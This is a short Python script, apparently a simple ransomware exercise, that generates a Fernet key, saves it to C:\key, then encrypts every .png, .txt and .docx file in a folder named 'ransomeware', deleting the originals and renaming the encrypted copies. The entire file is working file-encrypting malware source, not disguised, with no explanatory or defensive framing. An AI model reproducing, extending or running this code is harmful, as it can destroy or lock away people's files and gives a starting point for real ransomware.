import os
import random
from cryptography.fernet import Fernet
y=0
os.mkdir('C:\\key')
#Key generation
os.chdir('C:\\key')
key = Fernet.generate_key()
with open(f"key.key", "wb") as f:
        f.write(key)
encrpt=Fernet(key)

dir1="C:\\ransomeware"


#encrption process
os.chdir(dir1)
hap=os.listdir()
for x in hap:
    if x.endswith(".png"):
        with open(x,"rb") as f:
            data=f.read()
            f.close()
            changed=encrpt.encrypt(data)
            y=y+1
        os.remove(x)
        with open(f"image{y}.png","wb") as f:
            f.write(changed)

    elif x.endswith(".txt"):
        with open(x,"rb") as f:
            data=f.read()
            changed=encrpt.encrypt(data)
            f.close()
            y=y+1
        os.remove(x)
        with open(f"change{y}.txt","wb") as f:
            f.write(changed)

    elif x.endswith(".docx"):
        with open(x,"rb") as f:
            data=f.read()
            changed=encrpt.encrypt(data)
            f.close()
            y=y+1
        os.remove(x)
        with open(f"xyz{y}.docx","wb") as f:
            f.write(changed)





